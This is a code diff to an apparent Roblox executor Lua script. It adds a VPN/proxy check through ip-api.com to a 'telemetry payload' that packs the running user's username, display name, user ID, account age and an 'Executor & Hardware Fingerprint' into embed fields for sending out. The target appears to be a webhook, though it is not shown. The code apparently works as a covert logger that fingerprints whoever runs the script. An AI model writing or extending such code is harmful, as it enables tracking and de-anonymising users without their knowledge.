@@ -227,6 +227,21 @@ local function getFPS()
     return math.floor(workspace:GetRealPhysicsFPS())
 end
 
+local vpnProxyStatus = (function()
+    local ok, data = pcall(function()
+        return HttpService:JSONDecode(request({
+            Url = "http://ip-api.com/json/?fields=status,proxy,hosting",
+            Method = "GET"
+        }).Body)
+    end)
+
+    if not ok or not data or data.status ~= "success" then
+        return "UNKNOWN"
+    end
+
+    return data.proxy == true and "YES" or data.proxy == false and "NO" or "UNKNOWN"
+end)()
+
 -- 2. Build and Send Fully Expanded Telemetry Payload
 pcall(function()
     request({
@@ -253,20 +268,24 @@ pcall(function()
                     },
                     
                     fields = {
-                        -- 1. Identity & Account Details
-                        { 
-                            name = "👤 User Profile", 
-                            value = string.format("**Username:** %s\n**Display Name:** %s\n**User ID:** `%d`\n**Account Age:** %d days\n**Creation Date:** %s\n**Membership:** %s\n**Verified Badge:** %s", 
-                                p.Name, 
-                                p.DisplayName, 
-                                p.UserId, 
-                                p.AccountAge, 
-                                os.date("%Y-%m-%d", os.time() - (p.AccountAge * 86400)),
-                                tostring(p.MembershipType.Name),
-                                tostring(p.HasVerifiedBadge)
-                            ), 
-                            inline = true 
+                        -- VPN / Proxy Detection
+    {
+        name = "🛡️ VPN / Proxy Detection",
+        value = "**Detected:** " .. vpnProxyStatus,
+        inline = true
                         },
+
+    -- 1. Identity & Account Details
+    {
+        name = "👤 User Profile",
+        value = string.format("**Username:** %s\n**Display Name:** %s\n**User ID:** `%d`\n**Account Age:** %d days",
+            p.Name,
+            p.DisplayName,
+            p.UserId,
+            p.AccountAge
+        ),
+        inline = true
+    },
                         
                         -- 2. Executor & Hardware Fingerprint
                         { 
